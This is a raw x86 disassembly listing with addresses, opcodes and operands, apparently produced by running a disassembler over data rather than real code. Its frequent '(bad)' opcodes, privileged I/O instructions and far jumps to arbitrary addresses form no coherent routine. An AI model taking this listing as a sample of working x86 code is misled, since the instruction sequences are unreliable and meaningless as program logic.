  41fd8b:	inc    eax
  41fd8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8d:	stos   BYTE PTR es:[edi],al
  41fd8e:	aam    0x6f
  41fd90:	sti    
  41fd91:	(bad)  
  41fd92:	jle    0x41fd5c
  41fd94:	call   0xd381:0xcabb8e6f
  41fd9b:	neg    dl
  41fd9d:	aas    
  41fd9e:	ret    
  41fd9f:	cmp    bh,BYTE PTR [ecx+0x59]
  41fda2:	dec    esp
  41fda3:	push   edi
  41fda4:	dec    ebx
  41fda5:	adc    eax,0x558777c3
  41fdaa:	repz and DWORD PTR [ebx-0x67],0x2bc820e0
  41fdb2:	inc    esp
  41fdb3:	sbb    al,0x30
  41fdb5:	mov    edx,0x2a9f9c45
  41fdba:	sub    al,0xaf
  41fdbc:	cmp    DWORD PTR [edi],ecx
  41fdbe:	and    DWORD PTR [eax+0x76],eax
  41fdc1:	push   ss
  41fdc2:	push   es
  41fdc3:	bound  eax,QWORD PTR [ecx-0x3db317b6]
  41fdc9:	fist   DWORD PTR [ebx-0x7b0e8b73]
  41fdcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd0:	fwait
  41fdd1:	jg     0x41fe25
  41fdd3:	mov    ah,BYTE PTR [ecx-0x51d326d9]
  41fdd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdda:	sub    eax,0x8aa38fdf
  41fddf:	lahf   
  41fde0:	and    al,0xd1
  41fde2:	xor    eax,0xafdbac4e
  41fde7:	pop    edi
  41fde8:	push   es
  41fde9:	cmp    al,0x6a
  41fdeb:	fisttp DWORD PTR [ebp+0x324867cc]
  41fdf1:	mov    ds:0xd899c03a,al
  41fdf6:	lea    ecx,[ebx+0x4b]
  41fdf9:	pop    ebp
  41fdfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdfb:	xchg   edi,eax
  41fdfd:	or     BYTE PTR [ecx+eax*8],0xfd
  41fe01:	(bad)  
  41fe02:	clc    
  41fe03:	retf   0x256
  41fe06:	mov    ds:0x7eaa43a8,eax
  41fe0b:	int3   
  41fe0c:	pop    ds
  41fe0d:	mov    al,0x46
  41fe0f:	aaa    
  41fe10:	lds    eax,FWORD PTR [eax-0x80]
  41fe13:	push   ds
  41fe14:	fmul   DWORD PTR [edx-0x45aee90c]
  41fe1a:	xlat   BYTE PTR ds:[ebx]
  41fe1b:	and    al,0x48
  41fe1d:	outs   dx,BYTE PTR ds:[esi]
  41fe1e:	pushf  
  41fe1f:	pop    esp
  41fe20:	pop    ds
  41fe21:	xchg   ebp,eax
  41fe22:	jp     0x41fdfb
  41fe24:	or     DWORD PTR [ecx-0x3fd9fe5],ebp
  41fe2a:	adc    BYTE PTR [ebx],bl
  41fe2c:	mov    eax,ds:0xc952d8cd
  41fe31:	and    eax,0xa3efe368
  41fe36:	mov    ds:0x6f257379,al
  41fe3b:	test   eax,0xcc965c2d
  41fe40:	dec    esi
  41fe41:	leave  
  41fe42:	outs   dx,DWORD PTR ds:[esi]
  41fe43:	xchg   edi,eax
  41fe44:	pop    ds
  41fe45:	push   es
  41fe46:	les    esi,FWORD PTR [ebp-0x51]
  41fe49:	jl     0x41fdf9
  41fe4b:	lods   eax,DWORD PTR ds:[esi]
  41fe4c:	adc    eax,DWORD PTR [ecx-0x19b7b0a8]
  41fe52:	(bad)  
  41fe53:	and    ah,BYTE PTR [esi+0x2a]
  41fe56:	push   ss
  41fe57:	cmc    
  41fe58:	nop
  41fe59:	fst    QWORD PTR [edi]
  41fe5b:	out    0xe6,eax
  41fe5d:	mov    esp,0xdf1b22fb
  41fe62:	push   ebx
  41fe63:	push   es
  41fe64:	mov    edi,0xdeb2272
  41fe69:	lds    edi,FWORD PTR [ebx]
  41fe6b:	sbb    bh,bl
  41fe6d:	fsub   QWORD PTR [edi-0x43]
  41fe70:	aam    0x1a
  41fe72:	dec    ecx
  41fe73:	ret    0x5f8d
  41fe76:	pop    ss
  41fe77:	jp     0x41fe2b
  41fe79:	sbb    esp,esi
  41fe7b:	inc    esp
  41fe7c:	xchg   ebp,eax
  41fe7d:	and    BYTE PTR ds:0xa30d01c5,ah
  41fe83:	dec    eax
  41fe84:	fist   DWORD PTR [ecx-0x6e]
  41fe87:	sbb    esi,ecx
  41fe89:	sbb    DWORD PTR [edx-0x6],edi
  41fe8c:	inc    esi
  41fe8d:	xchg   ebx,eax
  41fe8e:	fist   DWORD PTR [edx+ebp*8-0x44]
  41fe92:	aas    
  41fe93:	loope  0x41fed5
  41fe95:	jmp    0x3f2e:0x618daf40
  41fe9c:	sbb    cl,BYTE PTR [eax+0x4257c100]
  41fea2:	push   0xc1af4a11
  41fea7:	cmp    DWORD PTR [ebx-0x44],esp
  41feaa:	leave  
  41feab:	sub    al,0xc3
  41fead:	pop    eax
  41feae:	loop   0x41fec4
  41feb0:	adc    al,0xec
  41feb2:	bound  ecx,QWORD PTR [esi+0x46]
  41feb5:	rcl    DWORD PTR [ebp-0x3812a7ea],1
  41febb:	sub    ebp,eax
  41febd:	mov    ah,0x61
  41febf:	inc    esi
  41fec0:	adc    al,0x3e
  41fec2:	xor    eax,0x57be5cb9
  41fec7:	jb     0x41fe9a
  41fec9:	popf   
  41feca:	sti    
  41fecb:	mov    edi,0x2c50b283
  41fed0:	in     eax,dx
  41fed1:	fcom   DWORD PTR ds:0x9b4afce3
  41fed7:	mov    BYTE PTR [ebp+ebx*4-0x29b1f774],bl
  41fede:	aam    0xcb
  41fee0:	clc    
  41fee1:	fistp  DWORD PTR [esi+0x26]
  41fee4:	add    dh,0x3f
  41fee7:	bound  esp,QWORD PTR [edi]
  41fee9:	pop    edi
  41feea:	add    esi,DWORD PTR [eax-0x7ae5c393]
  41fef0:	fbld   TBYTE PTR [edi-0x5f156932]
  41fef6:	sbb    ch,cl
  41fef8:	dec    ecx
  41fef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fefa:	mov    edi,es
  41fefc:	jecxz  0x41ff0d
  41fefe:	add    ebx,esp
  41ff00:	xchg   edi,eax
  41ff01:	shl    edx,cl
  41ff03:	dec    eax
  41ff04:	rcr    BYTE PTR [edx+0x15fa4bb8],1
  41ff0a:	jp     0x41ff21
  41ff0c:	in     eax,0xc
  41ff0e:	adc    ebp,DWORD PTR [ecx]
  41ff10:	scas   al,BYTE PTR es:[edi]
  41ff11:	xor    al,0x3c
  41ff13:	jae    0x41ff91
  41ff15:	stos   BYTE PTR es:[edi],al
  41ff16:	push   edx
  41ff17:	dec    ecx
  41ff18:	xchg   DWORD PTR [ebp+0x4b9281fa],edi
  41ff1e:	inc    esi
  41ff1f:	dec    dl
  41ff21:	nop
  41ff22:	div    DWORD PTR [ebx-0x4e]
  41ff25:	sbb    BYTE PTR [ebx],ah
  41ff27:	scas   al,BYTE PTR es:[edi]
  41ff28:	scas   al,BYTE PTR es:[edi]
  41ff29:	push   esi
  41ff2a:	mov    ecx,0x4327b6c
  41ff2f:	xchg   edi,eax
  41ff30:	add    ebp,edx
  41ff32:	ja     0x41ff4b
  41ff34:	popf   
  41ff35:	inc    ebx
  41ff36:	in     al,dx
  41ff37:	adc    edi,ebp
  41ff39:	repz popa 
  41ff3b:	popf   
  41ff3c:	stos   BYTE PTR es:[edi],al
  41ff3d:	adc    DWORD PTR [ecx],0xffffff8e
  41ff40:	mov    esp,0xd6fe77ce
  41ff45:	sub    DWORD PTR [eax-0x69],0x22
  41ff49:	test   al,0x1
  41ff4b:	cmp    ch,BYTE PTR [ebp-0x70fba86]
  41ff51:	push   0xffffff9b
  41ff53:	jg     0x41fef4
  41ff55:	dec    esi
  41ff56:	and    al,0x14
  41ff58:	inc    edx
  41ff59:	and    eax,0xacf5bb1e
  41ff5e:	(bad)  
  41ff5f:	mov    bl,0xc7
  41ff61:	fsub   st(4),st
  41ff63:	xlat   BYTE PTR ds:[ebx]
  41ff64:	cmp    ch,BYTE PTR [eax+0x41]
  41ff67:	push   cs
  41ff68:	xor    BYTE PTR [ecx+0x1e],ah
  41ff6b:	push   eax
  41ff6c:	mov    al,ds:0xd67d11f
  41ff71:	sti    
  41ff72:	pop    ecx
  41ff73:	lods   al,BYTE PTR ds:[esi]
  41ff74:	pusha  
  41ff75:	popf   
  41ff76:	add    al,ah
  41ff78:	imul   eax,DWORD PTR [esi],0x60296376
  41ff7e:	test   eax,0x8e36e8a3
  41ff83:	mov    DWORD PTR [ecx+ebp*4-0x5aaf619e],ebp
  41ff8a:	enter  0x34be,0x25
  41ff8e:	mov    ah,0x2a
  41ff90:	push   edx
  41ff91:	out    0x4e,eax
  41ff93:	out    dx,eax
  41ff94:	xchg   ebp,eax
  41ff95:	dec    esp
  41ff96:	ja     0x420012
  41ff98:	mov    al,0x95
  41ff9a:	mov    eax,ds:0xc09a0c90
  41ff9f:	fwait
  41ffa0:	int3   
  41ffa1:	(bad)  
  41ffa3:	in     al,dx
  41ffa4:	and    ebx,DWORD PTR [eax+0x5bf89474]
  41ffaa:	sti    
  41ffab:	mov    WORD PTR [edx+ebp*4-0x6fe85bb3],cs
  41ffb2:	arpl   WORD PTR [edi-0x2c],bx
  41ffb5:	and    al,0x67
  41ffb7:	repz add BYTE PTR [eax+0x6ecf4c44],ch
  41ffbe:	jnp    0x41ff51
  41ffc0:	inc    edx
  41ffc1:	shl    edx,1
  41ffc3:	test   BYTE PTR [edx+0x1],0xbf
  41ffc7:	jecxz  0x42001c
  41ffc9:	shl    DWORD PTR [edx-0x4bce37d0],1
  41ffcf:	add    eax,eax
  41ffd1:	les    ebx,FWORD PTR [eax]
  41ffd3:	and    DWORD PTR [edi+ecx*4],ebx
  41ffd6:	jmp    0xa1f6:0x59d46d54
  41ffdd:	rcl    DWORD PTR [ecx-0x3f],cl
  41ffe0:	add    eax,0x64f7f34f
  41ffe5:	xor    bl,cl
  41ffe7:	les    edi,FWORD PTR [eax]
  41ffe9:	pop    es
  41ffea:	mov    ebp,0x75393a20
  41ffef:	imul   ebx,DWORD PTR [edx-0x80],0xffffff9e
  41fff3:	xchg   ecx,eax
  41fff4:	leave  
  41fff5:	sub    al,0xad
  41fff7:	mov    WORD PTR [ebx+0x6b],es
  41fffa:	jmp    0x18fc:0x8287f8af
  420001:	aad    0x86
  420003:	adc    edi,ebx
  420005:	and    al,ah
  420007:	xchg   edi,eax
  420008:	(bad)  
  420009:	jo     0x41ff95
  42000b:	sub    cl,bh
  42000d:	jle    0x42005a
  42000f:	pop    edx
  420010:	xchg   ebp,eax
  420011:	fs inc esp
  420013:	sub    DWORD PTR [ecx+0x51],0x39
  420017:	into   
  420018:	dec    ecx
  420019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42001a:	sub    bl,BYTE PTR [edi+0x679a4335]
  420020:	shl    DWORD PTR [esi],0x4c
  420023:	cld    
  420024:	sbb    al,0xd6
  420026:	shl    ah,0xac
  420029:	mov    dl,0x23
  42002b:	mov    edi,0xff7607d2
  420030:	outs   dx,BYTE PTR ds:[esi]
  420031:	daa    
  420032:	mov    ebx,0x89e2b345
  420037:	mov    dh,BYTE PTR [ebx]
  420039:	jo     0x4200a5
  42003b:	fwait
  42003c:	imul   ecx,edx,0x15
  42003f:	int    0x27
  420041:	or     dh,BYTE PTR [esi-0x35d65616]
  420047:	and    al,0x98
  420049:	dec    ebp
  42004a:	sbb    eax,0x8ae195b8
  42004f:	push   ecx
  420050:	std    
  420051:	xor    DWORD PTR [ecx],0xffd77f14
  420057:	enter  0x40a8,0xd7
  42005b:	jecxz  0x41fff6
  42005d:	mov    bl,0xd
  42005f:	push   ebp
  420060:	or     DWORD PTR [edi+0x1d84e5c5],esi
  420066:	enter  0x20d3,0x20
  42006a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42006b:	mov    ah,0x15
  42006d:	nop
  42006e:	sbb    esi,DWORD PTR [esi-0x64]
  420071:	lea    ecx,[esi+0x43709f5d]
  420077:	pop    ecx
  420078:	fcomp  QWORD PTR [edi+eax*1-0x44]
  42007c:	iret   
  42007d:	in     eax,dx
  42007e:	adc    al,0xd7
  420080:	xlat   BYTE PTR ds:[ebx]
  420081:	jecxz  0x4200e9
  420083:	or     eax,0x7e595a91
  420088:	hlt    
  420089:	push   ecx
  42008a:	ds add dl,ah
  42008d:	dec    edx
  42008e:	iret   
  42008f:	shl    BYTE PTR [esi-0x7910f21c],0x8a
  420096:	cmp    ah,BYTE PTR ds:0xfb8368e3
  42009c:	ins    BYTE PTR es:[edi],dx
  42009d:	sub    dh,BYTE PTR [ecx+0x65fc200b]
  4200a3:	ds js  0x4200dd
  4200a6:	test   eax,0xf841f712
  4200ab:	and    BYTE PTR [ebx],ah
  4200ad:	lods   al,BYTE PTR ds:[esi]
  4200ae:	hlt    
  4200af:	jp     0x42006b
  4200b1:	jmp    0xf817:0xd7e0541e
  4200b8:	in     eax,0xd7
  4200ba:	es push ds
  4200bc:	xchg   ebx,eax
  4200bd:	call   0xe028c3b1
  4200c2:	and    al,ah
  4200c4:	aas    
  4200c5:	push   esi
  4200c6:	(bad)  
  4200c7:	dec    esi
  4200c8:	leave  
  4200c9:	out    dx,eax
  4200ca:	fcom   DWORD PTR [edx-0x41]
  4200cd:	add    DWORD PTR [esi-0x69757143],0xffffffe0
  4200d4:	sub    al,0xd4
  4200d6:	xchg   BYTE PTR [ebp+0x31],dh
  4200d9:	inc    ebp
  4200da:	push   cs
  4200db:	(bad)  
  4200dc:	iret   
  4200dd:	mov    ebp,0xe9bfdf06
  4200e2:	lock xor eax,0x4671aa1e
  4200e8:	push   ebx
  4200e9:	lahf   
  4200ea:	test   eax,0x65a61ad6
  4200ef:	and    al,0xc
  4200f1:	das    
  4200f2:	fcom   DWORD PTR [edx+0x56da5509]
  4200f8:	pop    ds
  4200f9:	icebp  
  4200fa:	sub    esp,edx
  4200fc:	iret   
  4200fd:	(bad)  
  4200fe:	retf   0xc996
  420101:	cmp    eax,0xb4ca7b3a
  420106:	sbb    eax,0x43703fe3
  42010b:	popaw  
  42010d:	and    edx,ebx
  42010f:	(bad)  
  420110:	push   edi
  420111:	dec    ebx
  420112:	sub    DWORD PTR [edi],ebx
  420114:	mov    BYTE PTR [ebx],cl
  420116:	push   ebp
  420117:	dec    ebx
  420118:	and    bh,BYTE PTR [ebx-0x71]
  42011b:	add    bh,BYTE PTR [ebp-0x75]
  42011e:	(bad)  
  42011f:	popa   
  420120:	sti    
  420121:	out    0x2a,eax
  420123:	call   0x6d9a:0x4ce7d4ed
  42012a:	push   es
  42012b:	aam    0x69
  42012d:	out    0x91,al
  42012f:	pop    esi
  420130:	shl    DWORD PTR [edi-0x14fe3859],1
  420136:	mov    DWORD PTR [ecx-0x12],ecx
  420139:	and    edi,DWORD PTR [ebx]
  42013b:	call   DWORD PTR [esp+edi*1]
  42013e:	xor    al,0x57
  420140:	dec    esp
  420141:	xchg   edi,eax
  420142:	xchg   edx,eax
  420143:	and    edx,DWORD PTR ds:0xcf02dea
  420149:	cmp    eax,0x19353d73
  42014e:	pop    ds
  42014f:	mov    bh,0x21
  420151:	js     0x420100
  420153:	inc    ebp
  420154:	and    al,0x4d
  420156:	adc    eax,0x65b11b98
  42015b:	data16 shr dh,cl
  42015e:	jae    0x420152
  420160:	inc    esp
  420161:	mov    al,ch
  420163:	pop    eax
  420164:	jmp    0x4201d4
  420166:	ficom  WORD PTR [edi-0x25]
  420169:	dec    esi
  42016a:	and    al,0xf7
  42016c:	stos   DWORD PTR es:[edi],eax
  42016d:	jbe    0x4201cd
  42016f:	or     eax,0xc952e471
  420174:	pop    ss
  420175:	xor    eax,0x5149f2bf
  42017a:	repz push esi
  42017d:	add    dh,ch
  42017f:	cld    
  420180:	ins    DWORD PTR es:[edi],dx
  420181:	test   DWORD PTR [ebx-0x2c],ebp
  420184:	ret    0xdfd
  420187:	mov    edx,0x8a96c5da
  42018c:	push   ebp
  42018d:	imul   eax,DWORD PTR [esi],0x51daac4a
  420193:	ror    bl,1
  420195:	xchg   edi,eax
  420196:	mov    bh,0x50
  420198:	sbb    bl,dh
  42019a:	pop    esi
  42019b:	pop    ds
  42019c:	and    DWORD PTR [eax+0x1c],edx
  42019f:	add    al,0x38
  4201a1:	mov    cl,0x28
  4201a3:	bswap  ebx
  4201a5:	fiadd  DWORD PTR [edx+0x7746c73a]
  4201ab:	jnp    0x420192
  4201ad:	jmp    0x2230dd11
  4201b2:	ficom  DWORD PTR [eax+0x51072617]
  4201b8:	mov    BYTE PTR [ebx],dl
  4201ba:	sbb    cl,BYTE PTR [ebx+0x3e]
  4201bd:	jp     0x42015b
  4201bf:	fisttp WORD PTR [eax]
  4201c1:	loopne 0x42020e
  4201c3:	adc    BYTE PTR [edi+0x827a134],al
  4201c9:	dec    edx
  4201ca:	jmp    0x25e34c35
  4201cf:	loopne 0x4201b8
  4201d1:	add    dh,dl
  4201d3:	mov    eax,0xf75511da
  4201d8:	jne    0x4201ee
  4201da:	xchg   DWORD PTR [esi-0x30],esp
  4201dd:	pop    eax
  4201de:	adc    BYTE PTR [edx],0x13
  4201e1:	mov    ebp,0x8ff10f6c
  4201e6:	cli    
  4201e7:	mov    ch,0xa
  4201e9:	mov    bl,0x4a
  4201eb:	adc    al,0xc5
  4201ed:	fistp  QWORD PTR [edx+0x7e2a85f7]
  4201f3:	mov    ebx,0xef02e7ae
  4201f8:	add    ecx,DWORD PTR [esi]
  4201fa:	pop    ds
  4201fb:	adc    DWORD PTR [edx+0x6cd44cb9],esp
  420201:	adc    al,0x15
  420203:	push   ebp
  420204:	stc    
  420205:	mov    dh,0xdb
  420207:	(bad)  
  420208:	xchg   esi,eax
  420209:	addr16 and eax,0x1eff798a
  42020f:	lds    edi,FWORD PTR [esi+0x21]
  420212:	arpl   di,bp
  420214:	sahf   
  420215:	sbb    BYTE PTR [ecx-0x5f79fbef],dh
  42021b:	(bad)  
  42021c:	loopne 0x4201cb
  42021e:	cs pop ebp
  420220:	inc    esp
  420221:	cdq    
  420222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420223:	and    BYTE PTR [esi],bl
  420225:	and    al,0x60
  420227:	neg    DWORD PTR [edx]
  420229:	sub    edx,DWORD PTR [ecx+0x3e]
  42022c:	or     dh,bh
  42022e:	scas   eax,DWORD PTR es:[edi]
  42022f:	mov    edx,0x579ca2e5
  420234:	mov    al,ds:0x2bfd2107
  420239:	(bad)
  42023e:	lds    ebx,FWORD PTR [edi+0x73]
  420241:	mov    ds:0x1372bc16,al
  420246:	jg     0x420218
  420248:	jns    0x4202a5
  42024a:	mov    BYTE PTR [ebx-0x10],cl
  42024d:	jne    0x420239
  42024f:	stos   DWORD PTR es:[edi],eax
  420250:	es out 0xbc,al
  420253:	mov    bh,0x34
  420255:	popf   
  420256:	xchg   BYTE PTR [eax+0x110ad0c6],bl
  42025c:	ret    
  42025d:	dec    ebx
  42025e:	push   cs
  42025f:	jle    0x4202a1
  420261:	sbb    BYTE PTR [esi+eiz*2-0x1f5b66c9],ch
  420268:	sbb    al,0x1b
  42026a:	(bad)  
  42026b:	push   esp
  42026c:	inc    ecx
  42026d:	mov    edx,0x44b1428e
  420272:	nop
  420273:	sbb    esi,DWORD PTR [eax]
  420275:	pop    esi
  420276:	pop    edi
  420277:	jnp    0x420224
  420279:	sub    bl,BYTE PTR [ebp+edi*4+0x6e]
  42027d:	lds    esi,FWORD PTR [ebx]
  42027f:	test   eax,0xd4df25a3
  420284:	into   
  420285:	add    BYTE PTR ds:0xdf92b083,dh
  42028b:	adc    bh,BYTE PTR [esi]
  42028d:	scas   al,BYTE PTR es:[edi]
  42028e:	mov    al,bl
  420290:	retf   
  420291:	fstp   DWORD PTR [ebx-0x62]
  420294:	aad    0x11
  420296:	ret    0x5c43
  420299:	mov    dl,0x88
  42029b:	pop    esp
  42029c:	push   ds
  42029d:	mov    BYTE PTR [edi],ch
  42029f:	xor    esp,DWORD PTR [ebp+0x73]
  4202a2:	in     al,0xe1
  4202a4:	mov    ch,0xbf
  4202a6:	xor    edi,DWORD PTR [eax+0x307147e3]
  4202ac:	push   ebx
  4202ad:	sbb    edi,eax
  4202af:	mov    ds,WORD PTR [ebp-0x63]
  4202b2:	xchg   edx,eax
  4202b3:	and    ah,BYTE PTR [edi+esi*2+0x3]
  4202b7:	mov    bl,0x62
  4202b9:	push   es
  4202ba:	scas   eax,DWORD PTR es:[edi]
  4202bb:	dec    edx
  4202bc:	inc    edx
  4202bd:	push   ecx
  4202be:	cwde   
  4202bf:	out    dx,eax
  4202c0:	ss cs in eax,0xcc
  4202c4:	ss xor ebx,ecx
  4202c7:	rol    DWORD PTR [ebx+0x1f3c021],cl
  4202cd:	sbb    DWORD PTR [edi+0x15f6133c],eax
  4202d3:	sbb    DWORD PTR ds:[edi],ecx
  4202d6:	inc    esi
  4202d7:	out    0x2f,al
  4202d9:	mov    ds:0xe4623481,al
  4202de:	lods   eax,DWORD PTR ds:[esi]
  4202df:	jmp    0x420360
  4202e1:	(bad)  
  4202e2:	cwde   
  4202e3:	mov    cl,0x57
  4202e5:	sub    al,0xc4
  4202e7:	mov    ecx,0x594f72a8
  4202ec:	repnz mov ch,BYTE PTR [edi+0x35]
  4202f0:	cdq    
  4202f1:	push   ebx
  4202f2:	inc    ecx
  4202f3:	mov    cl,0xc4
  4202f5:	lock push edi
  4202f7:	scas   eax,DWORD PTR es:[edi]
  4202f8:	inc    ebx
  4202f9:	push   eax
  4202fa:	repnz dec ecx
  4202fc:	adc    ecx,ebp
  4202fe:	xor    DWORD PTR ds:0x513ce964,0x1577927f
  420308:	sub    ah,BYTE PTR [eax+ebp*8]
  42030b:	test   eax,0xafbdb0aa
  420310:	lods   eax,DWORD PTR ds:[esi]
  420311:	cmp    DWORD PTR [ebp-0xc07d379],edx
  420317:	jp     0x420386
  420319:	lea    ebp,[eax]
  42031b:	out    dx,al
  42031c:	jge    0x420316
  42031e:	in     eax,0x4e
  420320:	call   0x53d1:0x7c6ff1f3
  420327:	cmp    DWORD PTR ds:0xa1d02cee,0x4e
  42032e:	push   ds
  42032f:	ss xor eax,0xd9e32892
  420335:	sahf   
  420336:	stos   BYTE PTR es:[edi],al
  420337:	jae    0x420376
  420339:	inc    esp
  42033a:	xor    ecx,ebp
  42033c:	dec    esp
  42033d:	mov    esp,0x6deb9746
  420342:	imul   esi,DWORD PTR [esp+edx*1],0x7e4e5b69
  420349:	sbb    DWORD PTR [ebp+eiz*4-0x3f],0x43570d33
  420351:	push   ss
  420352:	mov    DWORD PTR [edx],0x3bac255d
  420358:	push   cs
  420359:	cmp    dl,cl
  42035b:	aaa    
  42035c:	aas    
  42035d:	mov    bh,0x9
  42035f:	adc    esp,ebp
  420361:	or     ebp,DWORD PTR [esi]
  420363:	xchg   esp,eax
  420364:	out    dx,al
  420365:	inc    esp
  420366:	ror    BYTE PTR [ebx+0x52f991c9],cl
  42036c:	ret    0x28cb
  42036f:	enter  0x9704,0x63
  420373:	sub    al,0x5f
  420375:	pop    ss
  420376:	aaa    
  420377:	push   es
  420378:	mov    ebx,0xa5ab24ec
  42037d:	mul    BYTE PTR [ebx+eax*2]
  420380:	test   BYTE PTR [esi],0xee
  420383:	icebp  
  420384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420385:	clc    
  420386:	mov    WORD PTR [edx+0x23],ss
  420389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42038a:	ds add eax,0x6
  42038e:	and    eax,0x3a3af9b8
  420393:	sub    al,0x41
  420395:	ror    DWORD PTR [ecx+0x1b7b63f4],1
  42039b:	(bad)  
  42039c:	in     al,dx
  42039d:	jge    0x420338
  42039f:	scas   al,BYTE PTR es:[edi]
  4203a0:	push   ds
  4203a1:	inc    eax
  4203a2:	xor    eax,0x723b35c2
  4203a7:	push   es
  4203a8:	and    ebx,DWORD PTR [esi-0x469f495f]
  4203ae:	icebp  
  4203af:	xor    DWORD PTR [edx+0x71ebca37],edx
  4203b5:	xor    eax,0xc9895eb
  4203ba:	cld    
  4203bb:	push   ds
  4203bc:	ret    
  4203bd:	xchg   edi,eax
  4203be:	xchg   ecx,eax
  4203bf:	mov    ds:0x62720470,eax
  4203c4:	inc    ecx
  4203c5:	push   ebx
  4203c6:	jno    0x4203cd
  4203c8:	cmp    ecx,DWORD PTR [edx-0x17859df4]
  4203ce:	test   DWORD PTR [eax+0x70a3644f],ecx
  4203d4:	or     al,0x57
  4203d6:	pop    esi
  4203d7:	jbe    0x4203a7
  4203d9:	mov    ebp,0x20e37d65
  4203de:	shl    BYTE PTR [ecx-0x45db9b84],cl
  4203e4:	sbb    al,0xb5
  4203e6:	or     BYTE PTR [ebp+0x4a],0xc5
  4203ea:	or     DWORD PTR [ecx],esp
  4203ec:	xlat   BYTE PTR ds:[ebx]
  4203ed:	enter  0xcc38,0x3f
  4203f1:	in     eax,0x81
  4203f3:	fwait
  4203f4:	push   0xc
  4203f6:	sub    esp,0x1f
  4203f9:	and    DWORD PTR [eax+0x4ef00ef6],edi
  4203ff:	aam    0x2b
  420401:	sub    eax,0x7d7a0835
  420406:	loopne 0x420400
  420408:	dec    eax
  420409:	fsubr  QWORD PTR [eax]
  42040b:	mov    dl,0x3c
  42040d:	pusha  
  42040e:	and    eax,0x2409b40e
  420413:	and    cl,BYTE PTR [ebx]
  420415:	jmp    0x13e5:0xfb63ce5d
  42041c:	pop    edi
  42041d:	xor    eax,0xfea7b0b4
  420422:	add    BYTE PTR [eax-0x7f],0xa4
  420426:	or     BYTE PTR [edx-0x3a],ah
  420429:	push   eax
  42042a:	int3   
  42042b:	jns    0x420479
  42042d:	push   cs
  42042e:	xchg   edi,eax
  42042f:	and    BYTE PTR [edi+0x4c0db6d2],bh
  420435:	inc    edi
  420436:	arpl   WORD PTR [edi+0x148d1a9b],si
  42043c:	sub    dh,BYTE PTR [esi]
  42043e:	or     BYTE PTR [eax-0x3d],bl
  420441:	jo     0x420499
  420443:	sahf   
  420444:	in     al,0xba
  420446:	sbb    BYTE PTR [edi],ch
  420448:	pop    ecx
  420449:	or     al,0x38
  42044b:	pop    ebp
  42044c:	mov    dl,0xe5
  42044e:	in     al,dx
  42044f:	dec    edi
  420450:	pop    ebx
  420451:	or     dl,BYTE PTR [edi]
  420453:	daa    
  420454:	cmp    dl,BYTE PTR gs:[edi-0x5981926f]
  42045b:	xor    al,0x3d
  42045d:	lds    esi,FWORD PTR [ebx+0x537d1ba4]
  420463:	and    BYTE PTR [eax+0x42],dl
  420466:	repz xor ch,BYTE PTR [ecx]
  420469:	loopne 0x42045e
  42046b:	imul   esi,DWORD PTR [edx],0x2f300cfd
  420471:	and    ebx,0x14668057
  420477:	outs   dx,BYTE PTR gs:[esi]
  420479:	mov    dh,0x6f
  42047b:	pop    ss
  42047c:	fwait
  42047d:	imul   ebx,DWORD PTR [edi+0x52],0xb01f96f9
  420484:	xor    edi,DWORD PTR [ebp-0x256578e8]
  42048a:	mov    WORD PTR [edi],?
  42048c:	lods   al,BYTE PTR ds:[esi]
  42048d:	mov    ds:0x8efa1db8,al
  420492:	cmc    
  420493:	js     0x2ba91716
  420499:	cli    
  42049a:	inc    edx
  42049b:	adc    al,dh
  42049d:	into   
  42049e:	jmp    0x420489
  4204a0:	xchg   ebp,eax
  4204a1:	adc    al,0x54
  4204a3:	sbb    eax,edx
  4204a5:	call   0xde38b4f7
  4204aa:	sti    
  4204ab:	pop    edx
  4204ac:	pusha  
  4204ad:	mov    dh,0xec
  4204af:	xchg   ecx,eax
  4204b0:	push   ebx
  4204b1:	or     ebx,0x5a
  4204b4:	scas   eax,DWORD PTR es:[edi]
  4204b5:	cmp    edi,DWORD PTR [edx+0x6be9ea2b]
  4204bb:	jmp    FWORD PTR [ebx-0xb]
  4204be:	inc    DWORD PTR [esi]
  4204c0:	cmp    ebx,eax
  4204c2:	xor    dl,BYTE PTR [eax-0x26aa17be]
  4204c8:	or     DWORD PTR [edi+0x4e],eax
  4204cb:	sbb    bl,BYTE PTR [eax]
  4204cd:	push   ecx
  4204ce:	and    BYTE PTR es:[esp+eiz*2+0x34aa17a],bl
  4204d6:	mov    ebx,0x64e15687
  4204db:	mov    eax,ds:0xe25bcf0d
  4204e0:	adc    eax,0xb4300424
  4204e5:	lods   eax,DWORD PTR ds:[esi]
  4204e6:	mov    al,ds:0xcc666614
  4204eb:	loop   0x42054f
  4204ed:	sub    eax,0xec21e47d
  4204f2:	sahf   
  4204f3:	mov    ds:0x9fb1174d,al
  4204f8:	inc    ebp
  4204f9:	mov    eax,0xd9678ee6
  4204fe:	push   ss
  4204ff:	test   al,0x67
  420501:	fdiv   st,st(0)
  420503:	out    dx,eax
  420504:	mov    ecx,0x296d54eb
  420509:	jmp    0x4204a8
  42050b:	out    dx,eax
  42050c:	mov    ebp,0x3a509cfe
  420511:	mov    ecx,DWORD PTR [ebp+0x745f30db]
  420517:	and    eax,0xef7a6a87
  42051c:	xor    DWORD PTR [esi],esp
  42051e:	cmp    eax,0x75e56833
  420523:	sar    BYTE PTR [esi+0x67],1
  420526:	lock fidivr DWORD PTR [esi-0x30]
  42052a:	pop    edx
  42052b:	jle    0x42050d
  42052d:	fcom   DWORD PTR [esi]
  42052f:	test   DWORD PTR [ebp-0xd],ebx
  420532:	scas   al,BYTE PTR es:[edi]
  420533:	pop    ds
  420534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420535:	test   al,0xcf
  420537:	inc    ebx
  420538:	or     esp,DWORD PTR [esi+0x3e3aaac7]
  42053e:	cmc    
  42053f:	or     BYTE PTR [edi],bl
  420541:	lahf   
  420542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420543:	xchg   esi,eax
  420544:	adc    al,0xf0
  420546:	in     al,dx
